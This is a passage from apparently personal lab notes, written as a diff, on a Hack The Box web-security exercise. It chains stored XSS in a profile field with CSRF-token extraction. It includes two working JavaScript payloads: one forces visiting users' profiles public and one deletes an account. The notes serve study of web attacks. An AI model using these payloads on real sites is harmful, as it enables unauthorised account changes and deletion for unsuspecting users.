@@ -537,3 +537,76 @@ if we use the change visibility button on our new target and capture the request
 
 ![](Images/Pasted%20image%2020240305172416.png)
 
+the payload we want to insert into the country field is: 
+
+```javascript
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/app/change-visibility',true);
+req.send();
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/change-visibility', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf='+token+'&action=change');
+};
+</script>
+```
+
+this script will create an ObjectVariable called `req` that will generate our request   
+we send the GET request to `/app/change-visibility`  
+
+in the `handleResponse` function we define a token variable that gets the value of the `responseText` from the page we specified in our earlier request and looks for the hidden csrf field to grab the value 
+
+we know how to look for this by looking through the HTML: 
+
+![](Images/Pasted%20image%2020240305173546.png)
+
+if we can't find it there but we know that there are csrf tokens in use, then make sure to look through the source code, or use your own csrf token and look for it in the source code   
+
+the `handleRespose` function then sends the POST request to actually send the form info (the GET request was simply to get to the correct page to do so)   
+it will mimic the captured POST request logic by setting the csrf token value and the action value: 
+
+![](Images/Pasted%20image%2020240305173919.png)
+
+we now go to the victim's profile and set the country field to our payload: 
+
+![](Images/Pasted%20image%2020240305174132.png)
+
+then to simulate our victim's behavior we log in to an account: 
+
+![](Images/Pasted%20image%2020240305174232.png)
+
+notice that this profile doesn't have the "share" button, meaning that it is currently private  
+our payload script on our malicious user profile will attempt to change other profiles to become public
+
+now go and visit our public profile with our script in it `http://minilab.htb.net/profile?email=ela.stienen@example.com`: 
+
+![](Images/Pasted%20image%2020240305174343.png)
+
+then when we go back to our victim's profile we can see that it has been changed to a public one with the "share" button because of our script: 
+
+![](Images/Pasted%20image%2020240305174601.png)
+
+we can do the same with the delete functionality if we capture the request and modify our payload: 
+
+```javascript
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/app/delete/mhmdth.rdyy@example.com',true);
+req.send();
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/delete', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf='+token);
+};
+</script>
+```
+
+remember that these attacks can still go through even with the Same Origin policy because our code is executed on the domain   
+
